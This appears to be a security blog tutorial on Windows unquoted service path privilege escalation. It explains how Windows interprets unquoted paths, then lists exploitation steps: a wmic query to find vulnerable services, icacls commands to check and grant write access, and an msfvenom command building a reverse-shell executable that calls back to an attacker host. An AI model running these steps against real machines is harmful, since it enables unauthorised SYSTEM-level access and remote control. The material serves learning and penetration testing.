---
description: >-
  Unquoted Service Path
title: Unquoted Service Path             # Add title here
date: 2023-02-03 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Windows - Unquoted Service Path]                     # Change Templates to Writeup
tags: [windows privesc, unquoted service path]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around _unquoted service paths_. We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them.

Each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.

When using file or directory paths that contain spaces, the developers should always ensure that they are enclosed by quotation marks. This ensures that they are explicitly declared. However, when that is not the case and a path name is unquoted, it is open to interpretation. Specifically, in the case of executable paths, anything that comes after each whitespace character will be treated as a potential argument or option for the executable.

For example, imagine that we have a service stored in a path such as C:\\Program Files\\My Program\\My Service\\service.exe. If the service path is stored _unquoted_, whenever Windows starts the service it will attempt to run an executable from the following paths:

```c
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

In this example, Windows will search each "interpreted location" in an attempt to find a valid executable path. In order to exploit this and subvert the original unquoted service call, we must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and name it so that it also matches the interpreted filename. Then, when the service runs, it should execute our file with the same privileges that the service starts as. Often, this happens to be the NT\\SYSTEM account, which results in a successful privilege escalation attack.

For example, we could name our executable Program.exe and place it in C:\\, or name it My.exe and place it in C:\\Program Files. However, this would require some unlikely write permissions since standard users do not have write access to these directories by default.

It is more likely that the software's main directory (C:\\Program Files\\My Program in our example) or subdirectory (C:\\Program Files\\My Program\\My service) is misconfigured, allowing us to plant a malicious My.exe binary.

Although this vulnerability requires a specific combination of requirements, it is easily exploitable and a privilege escalation attack vector worth considering.

### Exploitation

First find programs _unquoted_ and with spaces using wmic:
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Verify that unsecure permissions are configured with icacls, if the permissions BUILTIN\Users has the write (W) permission then you can sucessfully execute this vector attack:
```cmd
C:\Program Files\Zen>icacls "C:\Program Files\Zen"
C:\Program Files\Zen BUILTIN\Users:(OI)(CI)(W)
                     NT SERVICE\TrustedInstaller:(I)(F)
                     NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                     BUILTIN\Administrators:(I)(F)
                     BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                     BUILTIN\Users:(I)(RX)(W)
                     BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                     CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
```

If by any chance there is no Write (W) permission you can still be able to add such permission with icacls:
```powershell
icacls "C:\Program Files\Vk9 Security/binary files" /GRANT "BUILTIN\Users":W
```

Upload a reverse shell created with msfvenom and upload it to the victim machine _unquoted_ path:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f exe -o zen.exe
```

Then restart the service so it is executed from your reverse shell.